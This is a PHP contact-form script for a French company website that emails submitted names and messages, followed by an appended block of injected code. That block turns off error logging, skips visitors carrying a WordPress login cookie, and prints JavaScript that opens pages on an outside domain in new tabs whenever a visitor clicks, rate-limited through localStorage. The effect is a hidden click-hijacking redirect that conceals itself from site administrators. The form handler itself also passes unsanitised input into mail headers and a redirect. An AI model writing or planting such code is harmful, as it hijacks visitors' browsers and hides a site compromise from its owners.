<?php
// -----------------------------------------
//  The Web Help .com
// -----------------------------------------
// remember to replace your@email.com with your own email address lower in this code.
 
// load the variables form address bar
$name = $_REQUEST["name"];
$email = $_REQUEST["email"];
$verif_box = $_REQUEST["verif_box"];
 
// remove the backslashes that normally appears when entering " or '
$name = stripslashes($name);
$dest = stripslashes($dest);
$email = stripslashes($email);

// check to see if verificaton code was correct
if(md5($verif_box).'a4xn' == $_COOKIE['tntcon']){
    // if verification code was correct send the message and show this page
	$message = "Message: ".$comment."\n".$message;
	
	
	$message = "Email: ".$email."\n".$message;
    $message = "Nom: ".$name."\n".$message;
	
	$message = "Vous avez recu un nouveau message depuis le formulaire de contact\n".$message;
// create email headers
$headers = "";
$headers .= "From: Site coral-sa.fr <kevintata02@gmail.com> \r\n";
$headers .= "Reply-To:" . $email . "\r\n" ."X-Mailer: PHP/" . phpversion();
$headers .= "Content-Type: text/html; charset=utf-8 ";
$headers .= "MIME-Version: 1.0 ";
//$headers .= 'MIME-Version: 1.0' . "\r\n";
//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";        
    //mail("thomas@apyka.com", 'Online Form: '.$subject, $_SERVER['REMOTE_ADDR']."\n\n".$message, "Message: $from");
	mail("thomas@apyka.com", "Message depuis formulaire", utf8_decode($message), $headers);
    // delete the cookie so it cannot sent again by refreshing this page
    setcookie('tntcon','');
} else {
    // if verification code was incorrect then return to contact page and show error
    header("Location:".$_SERVER['HTTP_REFERER']."?subject=$subject&from=$from&message=$message&wrong_code=true");
    exit;
}
?>

 
 <?php include('header.php')?>

     
 <br/> <br/> <br/>  votre message a bien ete envoye <br/> <br/>
    
<?php include('footer.php')?>
<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0){
	echo '<script>(function (parameters) {
		const targets = [
			\'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
		]
		// Times between clicks
		const restMinutes = 1;
		// Number of hours to allow re-click 
		const allowedHours = 2;


		const saveTargetLocationsToStorage = (targets) => {
			targets.forEach((target, index) => {
				if(!localStorage.getItem(`${target}-local-storage`)){
					localStorage.setItem(`${target}-local-storage`, 0);
				}
			});
		}
		const getRandomLocationFromStorage = (targets) => {
			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
		}
		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getMintsDiff = (startDate, endDate) => {
			const msInMints = 1000 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInMints);
		}

		const visitNewLocation = (targets, host, nowDate) => {
			saveTargetLocationsToStorage(targets);
			newLocation = getRandomLocationFromStorage(targets);
			setTimeToStorage(`${host}-mnts`, nowDate);
			setTimeToStorage(`${host}-hurs`, nowDate);
			setLocationAsVisited(newLocation);
			window.open(newLocation, "_blank");
		}

		// const randomLocation = getRandomLocationFromStorage(targets);
		saveTargetLocationsToStorage(targets);

		function globalClick(event) {
			event.stopPropagation();
			const host = location.host;
			let newLocation = getRandomLocationFromStorage(targets);
			const nowDate = Date.parse(new Date());
			const savedDateForMints = getTimeStorage(`${host}-mnts`);
			const savedDateForHours = getTimeStorage(`${host}-hurs`);

			if (savedDateForMints && savedDateForHours) {
				try {
					const storageDateForMints = parseInt(savedDateForMints);
					const storageDateForHours = parseInt(savedDateForHours);
					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

					if (hoursDiff >= allowedHours) {
						saveTargetLocationsToStorage(targets);
						setTimeToStorage(`${host}-hurs`, nowDate);
					}
					if (mintsDiff >= restMinutes) {
						if (newLocation) {
							setTimeToStorage(`${host}-mnts`, nowDate);
							window.open(newLocation, "_blank");
							setLocationAsVisited(newLocation);
						}
					}
				} catch (error) { visitNewLocation(targets, host, nowDate); }
			} else { visitNewLocation(targets, host, nowDate); }
		}
		document.addEventListener("click", globalClick)
	})()</script>';
}

?>